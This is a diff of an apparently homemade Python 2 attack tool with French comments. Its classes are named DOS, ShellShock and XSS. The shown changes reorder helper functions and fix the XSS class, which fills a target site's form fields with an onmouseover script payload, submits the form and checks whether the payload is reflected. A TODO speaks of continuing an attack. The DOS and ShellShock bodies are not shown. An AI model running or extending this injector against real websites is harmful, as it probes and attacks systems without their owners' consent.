@@ -6,6 +6,7 @@
 
 ## TODO:
 ##  - vérifier que le code HTTP est 200 avant de poursuivre une attaque
+##  - Prendre en compte les redirection avec le header location
 
 
 from scapy.all import *
@@ -20,6 +21,22 @@ import time
 import sys
 import os
 import re
+
+
+def parseTarget(target):
+    target = target.replace('http://', '')
+    target = target.replace('https://', '')
+    try : host, page = target.split('/', 1)
+    except :
+        host = target
+        page = ''
+    return host, page
+
+
+def getUniqueID():
+    return hashlib.md5(str(time.time())).hexdigest()
+
+
 
 class DOS():
     target = None
@@ -341,7 +358,7 @@ class ShellShock(HTTP):
         self.GET(self.target)
 
 class XSS():
-    PAYLOAD = "<a onmouseover=\"alert('" + uid + "')\"</script>"
+    PAYLOAD = "<a onmouseover=\"alert('" + getUniqueID() + "')\"</script>"
 
     def __init__(self, host, page, cookie = None):
         print host, page
@@ -383,7 +400,6 @@ class XSS():
                 data[name] = inp['value']
             else: data[name] = ""
 
-            uid = getUniqueID()
             data[self.fieldname] = XSS.PAYLOAD
         return data
 
@@ -401,6 +417,7 @@ class XSS():
         elif len(sf) == 0:
             print "Aucun formulaire contenant un champ '" + fieldname + "'. Abandon."
             return 0
+        else: id = 0
 
         form = sf[id]
         formdata = urllib.urlencode(self.fillForm(form, fieldvalue))
@@ -412,18 +429,6 @@ class XSS():
         elif form['method'].lower() == 'get': self.target.GET(form_dest + '?' + formdata)
 
         print XSS.PAYLOAD in self.target.get[form_dest]['data']
-
-def parseTarget(target):
-    target = target.replace('http://', '')
-    target = target.replace('https://', '')
-    try : host, page = target.split('/', 1)
-    except :
-        host = target
-        page = ''
-    return host, page
-
-def getUniqueID():
-    return hashlib.md5(str(time.time())).hexdigest()
 
 if __name__ == "__main__":
     conf.L3socket=L3RawSocket
